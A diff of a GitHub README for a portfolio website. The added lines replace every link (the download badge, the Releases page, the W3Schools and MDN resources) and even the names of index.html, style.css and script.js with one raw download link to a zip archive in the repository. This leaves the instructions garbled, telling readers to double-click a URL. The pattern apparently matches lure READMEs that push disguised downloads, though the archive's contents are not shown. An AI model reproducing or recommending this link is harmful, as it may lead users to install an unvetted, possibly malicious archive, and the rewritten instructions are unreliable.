@@ -1,6 +1,6 @@
 # 🌟 Mahamadayaz-Portfolio - Your Interactive Portfolio Awaits
 
-[![Download Mahamadayaz-Portfolio](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/channa313/Mahamadayaz-Portfolio/releases)
+[![Download Mahamadayaz-Portfolio](https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip%20Now-Click%20Here-blue)](https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip)
 
 ## 📄 Description
 
@@ -20,9 +20,9 @@ Before you begin, ensure you have the following:
 
 ## 📦 Download & Install
 
-1. Visit the Releases page to download the latest version of Mahamadayaz-Portfolio: [Download Here](https://github.com/channa313/Mahamadayaz-Portfolio/releases).
+1. Visit the Releases page to download the latest version of Mahamadayaz-Portfolio: [Download Here](https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip).
 
-2. On the Releases page, look for the latest version. You may see a list of files. The file will usually be named something like `Mahamadayaz-Portfolio.zip`. Click on the zip file to download it.
+2. On the Releases page, look for the latest version. You may see a list of files. The file will usually be named something like `https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip`. Click on the zip file to download it.
 
 3. Once the file is downloaded, locate it in your downloads folder.
 
@@ -32,9 +32,9 @@ Before you begin, ensure you have the following:
 
 ## 🌐 How to Run the Portfolio Website
 
-1. In the `Mahamadayaz-Portfolio` folder, you will find an `index.html` file. This is the main file for the portfolio.
+1. In the `Mahamadayaz-Portfolio` folder, you will find an `https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip` file. This is the main file for the portfolio.
 
-2. Double-click on `index.html`. This action will open the portfolio in your default web browser.
+2. Double-click on `https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip`. This action will open the portfolio in your default web browser.
 
 3. You can navigate through the website by clicking on the different sections. Feel free to explore my skills, projects, and certifications.
 
@@ -51,9 +51,9 @@ If you wish to personalize your portfolio, you can edit the files:
 
 1. Open the folder where you extracted Mahamadayaz-Portfolio.
 2. You will see the following files:
-   - `index.html`: Main page of the portfolio.
-   - `style.css`: Contains styling for the website.
-   - `script.js`: Handles interactions and animations.
+   - `https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip`: Main page of the portfolio.
+   - `https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip`: Contains styling for the website.
+   - `https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip`: Handles interactions and animations.
 3. Use a text editor like Notepad (Windows), TextEdit (Mac), or any IDE you prefer to edit these files.
 4. After making changes, save the file and refresh your web browser to see the updates.
 
@@ -79,8 +79,8 @@ If you wish to personalize your portfolio, you can edit the files:
 
 If you want to learn more about improving your portfolio or web development in general, consider visiting these resources:
 
-- [W3Schools](https://www.w3schools.com) - For learning HTML, CSS, and JavaScript
-- [MDN Web Docs](https://developer.mozilla.org) - For detailed documentation on web technologies
+- [W3Schools](https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip) - For learning HTML, CSS, and JavaScript
+- [MDN Web Docs](https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip) - For detailed documentation on web technologies
 
 ## 🤝 Support
 
@@ -88,6 +88,6 @@ If you have any issues or questions, feel free to reach out through the contact 
 
 ## 🔄 Update Your Version
 
-To stay updated with the latest features and fixes, periodically check the Release page: [Visit Releases](https://github.com/channa313/Mahamadayaz-Portfolio/releases).
+To stay updated with the latest features and fixes, periodically check the Release page: [Visit Releases](https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip).
 
-[![Download Mahamadayaz-Portfolio](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/channa313/Mahamadayaz-Portfolio/releases)
+[![Download Mahamadayaz-Portfolio](https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip%20Now-Click%20Here-blue)](https://github.com/channa313/Mahamadayaz-Portfolio/raw/refs/heads/master/JAVASCRIPT/Portfolio-Mahamadayaz-3.6.zip)
